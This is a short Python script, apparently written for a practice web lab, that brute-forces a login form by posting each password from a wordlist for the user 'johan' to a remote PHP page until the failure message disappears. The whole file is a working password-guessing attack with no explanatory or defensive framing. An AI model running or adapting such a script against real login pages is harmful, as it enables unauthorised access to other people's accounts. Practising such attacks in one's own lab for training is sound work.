import requests

class bruteforce:
    def __init__(self):
        self.url = "https://nikkoenggaliano.my.id/labs/web/hack0.php"
        self.password = open('password.txt').read().split("\n")
        self.execute()

    def execute(self):
        for i in self.password:
            data = {
            "userkak": "johan",
            "p": i,
            "submit": "Log+on!"
            }
            do = requests.post(self.url, data).text
            if "Was Wrong boys!" in do:
                print("{} Salah".format(i))
            else:
                print("Benar {}".format(i))
                exit(0)
                
bruteforce()
